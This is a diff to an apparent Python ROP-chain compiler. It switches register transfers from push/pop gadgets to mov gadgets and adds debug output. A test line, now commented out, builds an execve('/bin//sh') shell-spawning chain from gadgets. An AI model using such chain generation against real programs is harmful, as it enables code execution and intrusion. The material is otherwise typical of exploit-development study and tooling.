@@ -281,18 +281,10 @@ def popcontrol(Gadgets):
 def fromcontrol(Gadgets, popcontrolled):
     control = [[], [], [], [], [], [], [], []]
     for i, _ in enumerate(registers):
-        if popcontrolled[i]:
-            for r in registers:
-                if "push " + r + " ; ret":
-                    control[i].append(r)
+        for r in registers:
+            if "mov " + registers[i] + ", " + r + " ; ret" in Gadgets:
+                control[i].append(r)
 
-    return control
-
-def tocontrol(Gadgets):
-    control = [[]] * len(registers)
-    for i, r in enumerate(registers):
-        if "push " + r + " ; ret":
-            control[i] = popcontrol(Gadgets)
     return control
 
 def xorcontrol(Gadgets):
@@ -357,6 +349,7 @@ def setExecutionSearch(startstate, endstate, Gadgets):
     savedreg = []
     while True:
         savedreg = registersToSet
+        print(savedreg)
         #iterate through registers which need to be set to a string value
         for i, r in enumerate(registersToSet):
             if r and type(getFromLoc(endstate, registers[i])) is str:
@@ -367,14 +360,7 @@ def setExecutionSearch(startstate, endstate, Gadgets):
                 for f in fromcontrolled[i]:
                     if getFromLoc(startstate, f) == getFromLoc(endstate, registers[i]):
                         print("found value in " + f)
-                        execution.append(popcontrolled[i])
-                        pops = [x[-4:-1] for x in removeRet(popcontrolled[i]).split(";")]
-                        pops.reverse()
-                        for pop in pops:
-                            if pop == registers[i]:
-                                execution.append("push " + f + " ; ret")
-                            else:
-                                execution.append("push " + pop + " ; ret")                              
+                        execution.append("mov " + registers[i] + ", " + f + " ; ret")                             
                         registersToSet[i] = False
                 #break early if exact value found
                 if registersToSet[i] == False:
@@ -428,14 +414,7 @@ def setExecutionSearch(startstate, endstate, Gadgets):
                             registersToSet[i] = False
                         elif "dec " + f + " ; ret" in Gadgets and "inc " + f + " ; ret" in Gadgets:
                             execution.extend(["inc " + f + " ; ret"] * (addressplus - goaladdress))
-                            execution.append(popcontrolled[i])
-                            pops = [x[-4:-1] for x in removeRet(popcontrolled[i]).split(";")]
-                            pops.reverse()
-                            for pop in pops: 
-                                if pop == registers[i]:
-                                    execution.append("push " + f + " ; ret")
-                                else:
-                                    execution.append("push " + pop + " ; ret")    
+                            execution.append("mov " + registers[i] + ", " + f + " ; ret") 
                             execution.extend(["dec " + f + " ; ret"] * (addressplus - goaladdress))
                             registersToSet[i] = False
                             break
@@ -448,26 +427,19 @@ def setExecutionSearch(startstate, endstate, Gadgets):
                             registersToSet[i] = False
                         elif "dec " + f + " ; ret" in Gadgets and "inc " + f + " ; ret" in Gadgets:
                             execution.extend(["dec " + f + " ; ret"] * (goaladdress - addressplus))
-                            execution.append(popcontrolled[i])
-                            pops = [x[-4:-1] for x in removeRet(popcontrolled[i]).split(";")]
-                            pops.reverse()
-                            for pop in pops:
-                                if pop == registers[i]:
-                                    execution.append("push " + f + " ; ret")
-                                else:
-                                    execution.append("push " + pop + " ; ret")   
+                            execution.append("mov " + registers[i] + ", " + f + " ; ret") 
                             execution.extend(["inc " + f + " ; ret"] * (goaladdress - addressplus))
                             registersToSet[i] = False
                             break
 
                     #move value from source register if source is not destination
                     if f != registers[i]:
-                        execution.append("pop " + registers[i] + " ; ret")
-                        execution.append("push " + f + " ; ret")
+                        execution.append("mov " + registers[i] + ", " + f + " ; ret") 
 
                     if registersToSet[i] == False:
                         break
         
+        print(registersToSet)
         #break out of loop if no progress is made
         if savedreg == registersToSet:
             break
@@ -510,8 +482,7 @@ def create(shellcode, gadgets):
 
     #Reverse Execution from goal
     execution = []
-    execution.append("push esp ; ret")
-    execution.append("pop ebp ; ret")
+    execution.append("mov ebp, esp ; ret")
     System.sbase = "@ .data"
 
     #Load to .data
@@ -563,5 +534,9 @@ if __name__ == "__main__":
     print("xchg eax, edx ; ret" in dictionary)
     print("sub eax, ; ret" in dictionary)
 
-    print("CREATE TEST")
-    create(["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11, gadgets)
+    for i in dictionary.keys():
+        if "esp" in i:
+            print(i)
+
+    #print("CREATE TEST")
+    #create(["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11, gadgets)
